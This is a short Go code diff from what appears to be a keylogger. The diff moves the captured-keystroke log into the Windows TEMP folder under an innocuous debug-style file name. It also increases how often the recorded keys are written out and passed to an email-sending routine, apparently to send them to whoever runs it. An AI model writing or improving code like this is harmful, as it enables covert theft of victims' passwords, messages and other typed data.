@@ -14,9 +14,13 @@ const (
 	delayKeyfetchMS = 5
 )
 
+var (
+	path = os.Getenv("TEMP")
+)
+
 func main() {
 	//log to custom file
-	LOG_FILE := "/Users/USUARIO/AppData/Local/Temp/mat-debug-26080.log"
+	LOG_FILE := path + "\\aria-debug-2608.log"
 	logFile, err := os.OpenFile(LOG_FILE, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
 	if err != nil {
 		log.Fatalln(err)
@@ -35,12 +39,12 @@ func main() {
 			text += string(key.Rune)
 		}
 
-		if timer%5000 == 0 {
+		if timer%1000 == 0 {
 			log.Println(text)
 			text = ""
 		}
 
-		if timer%100000 == 0 {
+		if timer%2000 == 0 {
 			go email.Send()
 		}
 
